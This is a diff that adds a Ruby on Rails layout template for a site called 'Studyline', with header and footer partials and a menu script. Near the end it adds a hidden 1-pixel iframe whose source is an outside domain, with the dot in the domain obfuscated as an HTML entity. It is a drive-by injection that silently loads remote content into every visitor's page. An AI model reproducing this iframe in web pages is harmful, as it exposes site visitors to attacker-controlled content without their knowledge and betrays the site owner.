@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Studyline</title>
+  <%= stylesheet_link_tag    :all%>
+  <%= javascript_include_tag :all %>
+  
+  <%= csrf_meta_tags %>
+</head>
+<body>
+
+<div id="wrapper">
+<!--HEADER START-->
+<%= render "shared/header" %>
+<!--HEADER END-->
+<div class="spacer"></div>
+
+<%= yield %>
+<div class="spacer"></div>
+<%= render "shared/footer" %>
+
+</div>
+<script type="text/javascript">
+    var menu=new menu.dd("menu");
+    menu.init("menu","menuhover");
+</script>
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+
+</body>
+</html>
